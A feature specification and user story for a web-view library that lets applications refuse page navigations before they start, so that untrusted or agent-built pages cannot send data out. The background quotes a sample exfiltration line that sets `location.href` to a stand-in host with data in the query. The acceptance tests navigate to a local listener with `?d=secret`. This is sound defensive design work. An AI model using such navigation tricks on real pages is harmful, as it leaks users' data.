# Story Decomposition: Decide Where A Page May Navigate

## INVEST Analysis

### Abstract Task: "The Application Says Yes Or No Before A Page Leaves"

**Analysis Dimensions**:
- **Core Responsibility**: Let an application decide, before it happens, whether a page may navigate its
  view to another address. A refused navigation never starts: no request leaves the machine, and the
  page stays where it is.
  - A page can already be kept from loading things from other addresses, by its content security policy.
    The one thing that policy cannot stop is the page moving the whole view elsewhere: following a link,
    setting `location.href`, or submitting a form to the top window. A navigation carries whatever the page
    puts in the address, so today a page can always send data out of the application.
  - Popups already have their own decision (the popup handler). This story covers the view's own
    navigations.
- **Primary Operations**:
  - install a navigation handler on a component;
  - receive each navigation of the view and its frames (target address, current address, what caused it,
    and whether the application itself asked for it) and allow or refuse it;
  - find out whether the loaded native library can decide navigations.
- **Key Constraints**:
  - It must work on all three engines (WebView2, WebKitGTK, WKWebView), in every component mode, and in
    popups adopted into a component.
  - The decision is made before the engine sends any request, so the handler is asked synchronously on
    the engine's own thread. It cannot wait for the Swing event thread.
  - The safe outcome of a failure is a refusal: a handler that throws refuses the navigation.
  - The application's own navigations (`setUrl`) must be distinguishable from the page's, so an address
    bar can still leave a page the application keeps from leaving by itself.
  - With no handler installed, nothing changes.
- **Technical Complexity**: High. It needs three native implementations and a synchronous decision
  from native code into Java, like the popup decision.
- **Business Complexity**: Low. One handler, one yes-or-no.

### INVEST Evaluation
- ✅ **Independent**: builds on the existing engine wrappers only.
- ✅ **Negotiable**:
  - which facts the event carries beyond the address;
  - whether frames are decided too. They are: WebKitGTK reports frame navigations exactly like the view's
    own, with nothing to tell them apart, so the only portable, and the safer, choice is to decide both.
- ✅ **Valuable**: an application can host pages it does not fully trust (pages a user or an agent
  wrote, or a file someone sent) without those pages being able to send their data to the internet.
- ✅ **Estimable**: one decision point per engine, following the popup decision's pattern.
- ⚠️ **Small**: about 4 days across three engines. It stays one story, as custom schemes did (story 8),
  because the value is a portable guarantee. A guard that holds on one platform is not one an
  application can rely on.
- ✅ **Testable**: a page can try each kind of navigation, and a local listener shows whether any request
  arrived.

**Conclusion**: **Ready as-is — one story.**

### Split Strategy
Not applicable — no split needed.

---

## [STORY-010-001] Decide where a page may navigate

### Background

Applications built on this library show pages they don't fully trust. The Agentic App Framework's
Builder is the first: people, and agents on their behalf, write small web apps ("creations") that run in
a tab at their own address. The application keeps each creation to its own address with a strict
content security policy, so it can't fetch, load images or frames from other addresses, or post forms
elsewhere.

That policy has one hole the web platform cannot close. A page can always navigate its own tab:
`location.href = "https://elsewhere.example/?d=" + data`, a link click, or `<meta http-equiv="refresh">`.
The browser leaves and sends the address, data and all. The standard's rule that would have covered it
(`navigate-to`) was withdrawn and never shipped.

The framework's next step is to let agents hand data to a creation through its tools. Once that
happens, a creation holds data it was given from elsewhere: the user's emails, documents or records. It
must not be able to pass that on. The framework has made this story a firm prerequisite of that work.

Every engine can refuse a navigation before it starts, each through a different API. This story adds
**one** portable way to do it:
- the application installs a navigation handler on a component;
- before each top-level navigation, the handler is told where the view is going, where it is now, what
  caused it, and whether the application asked for it itself;
- it answers yes or no, and a no means nothing is sent.

### Business Value
- Provide **application developers** with a guarantee that a page they host cannot send data out by
  navigating, on every platform.
- Support **hosting untrusted pages**: user-written apps, imported files and agent-built pages, beside
  the user's own data.
- Enable **the application's own controls to keep working**: an address bar can still take the user
  anywhere, because the application's own navigations are marked as such.

### Dependencies and Assumptions
- **Prerequisites**: none.
- **Data assumptions**: the application knows, per component, which destinations it allows.
- **Integration points**:
  - WebView2 on Windows: the navigation-starting event, which can cancel.
  - WebKitGTK on Linux: the web view's policy decision for navigation actions.
  - WKWebView on macOS: the navigation delegate's navigation-action policy.
- **Business constraints**:
  - no new mandatory runtime dependency (Linux keeps loading WebKit at runtime);
  - no change for applications that install no handler.

### Scope In
- **Installing a navigation handler** on a component, and removing it (back to allowing everything).
- **The handler is asked about every navigation** of the component's view and of its frames, before any
  request is sent:
  - links, including those with a `download` attribute;
  - script navigations (`location.href`, `location.assign`, `location.replace`);
  - forms submitted to the top window;
  - refreshes by `<meta http-equiv="refresh">`;
  - back, forward and reload;
  - server redirects;
  - a frame loading its first page, including `about:blank` and `about:srcdoc`.
- **What the handler is told**:
  - the target address;
  - the view's current address;
  - the cause: link, form, back/forward, reload, redirect or other;
  - whether the application itself asked for it (`setUrl`), which a server redirect of such a navigation
    keeps.
- **Refusing** leaves the page as it was: no error page, no request, no change of address.
- **A handler that throws** refuses the navigation, and the application keeps running.
- **Popups adopted into a component** are decided by that component's handler once adopted.
- **`isNavigationHandlerSupported()`**: whether the loaded native library can decide navigations.
- **A demo** whose page tries each kind of navigation to an address the handler refuses.

### Scope Out
- Telling a frame's navigation from the view's own: not every engine can.
- Popups and new windows (the popup handler already decides these).
- Navigations inside a popup the engine hosts in its own window, or inside a popup decided "adopt"
  before a component adopts it. An application that restricts where a page may go should block or
  adopt that page's popups, which its popup handler already can.
- Rewriting or redirecting a navigation to another address.
- Asking the user; the handler decides silently, and the application may tell the user itself.
- Requests a page makes without navigating (images, `fetch`), which content security policy governs.

### Acceptance Criteria

#### AC1: A refused link doesn't leave the page, and nothing is sent
**Given** a page at `demo://app/` with a link to `http://127.0.0.1:8123/?d=secret`, a listener on port
8123, and a handler that refuses every address outside `demo://app/`
**When** the user clicks the link
**Then** the page stays at `demo://app/` with its content unchanged, the listener receives no request,
and the handler was told the target `http://127.0.0.1:8123/?d=secret`, the current address
`demo://app/` and the cause "link".

#### AC2: A script can't navigate away either
**Given** the same page and handler
**When** a script sets `location.href`, calls `location.assign` and `location.replace`, or the page
carries `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:8123/">`
**Then** each attempt is refused, the page stays, and the listener receives nothing.

#### AC3: A form posted to the top window is refused
**Given** the same page with `<form action="http://127.0.0.1:8123/" method="post" target="_top">`
**When** it is submitted
**Then** it is refused with the cause "form", and the listener receives nothing.

#### AC4: Allowed navigations work as before
**Given** a handler that allows `demo://app/…`
**When** the page follows a link to `demo://app/next.html`
**Then** `next.html` loads and the component's address is `demo://app/next.html`.

#### AC5: The application's own navigations are marked
**Given** the same refusing handler
**When** the application calls `setUrl("https://example.com/")`
**Then** the handler is told the navigation was asked for by the application, and when it allows it,
the page loads. A navigation to the same address started by the page is not marked. If
`https://example.com/` redirects to `https://www.example.com/`, the redirect is marked too.

#### AC6: Back, forward and reload are reported with their cause
**Given** a view that went from `demo://app/` to `demo://app/next.html`
**When** the page calls `history.back()`, then `history.forward()`, then `location.reload()`
**Then** the handler is told "back/forward", "back/forward" and "reload", and each proceeds when
allowed.

#### AC7: A handler that fails refuses
**Given** a handler that throws for `http://127.0.0.1:8123/`
**When** the page navigates there
**Then** the navigation is refused, nothing is sent, and the component and application keep running.

#### AC8: Without a handler nothing changes
**Given** a component with no navigation handler, or one reset to the default
**When** the page follows any link
**Then** it navigates as it did before this feature.

#### AC9: An adopted popup is decided by its component's handler
**Given** a popup adopted into a new component that has the refusing handler
**When** the popup's page tries to navigate to `http://127.0.0.1:8123/`
**Then** it is refused and the listener receives nothing.

#### AC10: Frames are decided too
**Given** the refusing handler, which also allows `about:blank` and `about:srcdoc`, and a page with an
`<iframe srcdoc="…">` whose page sets its own `location.href` to `http://127.0.0.1:8123/`
**When** the frame navigates
**Then** it is refused, and the listener receives nothing, while the page and its frame's first page
load normally.

#### AC11: An older native library says so
**Given** an application running against a native library built before this feature
**When** it asks whether navigation decisions are supported
**Then** it is told no, so it can refuse to show untrusted pages rather than show them unguarded.

#### Note on causes
The cause is reported as each engine knows it. WebView2 on Windows can't tell a link from a form or a
script, so it reports those as "other". WKWebView on macOS doesn't flag server redirects, so it reports
them as "other". The ACs above name the cause where the engine reports it.

#### Non-Functional Expectations
- Deciding a navigation adds no noticeable delay to page loads; a handler that answers at once costs
  well under a millisecond per navigation.
- The decision never waits for the application's event thread, so a busy event thread can't stall the
  engine.
